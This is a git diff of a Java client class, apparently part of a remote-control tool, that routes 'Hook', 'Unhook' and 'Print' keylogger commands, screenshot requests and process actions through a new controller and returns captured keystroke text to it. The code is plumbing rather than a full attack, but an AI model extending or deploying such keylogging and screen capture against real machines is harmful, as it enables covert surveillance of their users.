@@ -11,6 +11,8 @@ import java.net.Socket;
 import java.nio.charset.StandardCharsets;
 import java.util.ArrayList;
 
+import controller.Controller;
+
 public class Client
 {
     public Client()
@@ -39,6 +41,35 @@ public class Client
         }
 
         return "Success";
+    }
+
+    public void addController(Controller controller) {
+        this.controller = controller;
+    }
+
+    public void handleAction(String action) {
+        switch(action) {
+            case "Hook":
+            case "Unhook":
+            case "Print":
+                handleKeyLogger(action);
+                break;
+            case "ScreenShot":
+                handleScreenShot(action);
+                break;
+            case "StartProcess":
+            case "StopProcess":
+            case "ListProcess":
+                break;
+        }
+    }
+
+    private void notifyController(String action, String out) {
+        this.controller.handleReturnedValue(action, out);
+    }
+
+    private void notifyController(String action, BufferedImage out) {
+        this.controller.handleReturnedValue(action, out);
     }
 
     public void setIP(String IP) {
@@ -75,7 +106,7 @@ public class Client
         return image;
     }
 
-    public String handleKeyLogger(String command)
+    private void handleKeyLogger(String command)
     {
         try
         {
@@ -91,24 +122,21 @@ public class Client
                     isHook = false;
                     break;
                 case "Print":
+                    String out = "";
                     if (isHook)
                     {
                         byte[] buffer = new byte[5 * 1024];
                         inputStream.read(buffer);
-                        String out = new String(buffer);
+                        out = new String(buffer);
                         out = out.trim();
-                        return out;
                     }
-
-                    return "";
+                    notifyController(command, out);
             }
         }
         catch (IOException ioE)
         {
             ioE.printStackTrace();
         }
-
-        return "";
     }
 
     public Process getProcess() {
@@ -165,4 +193,5 @@ public class Client
     private InputStream inputStream;
     private OutputStream outputStream;
     private Process process;
+    private Controller controller;
 }
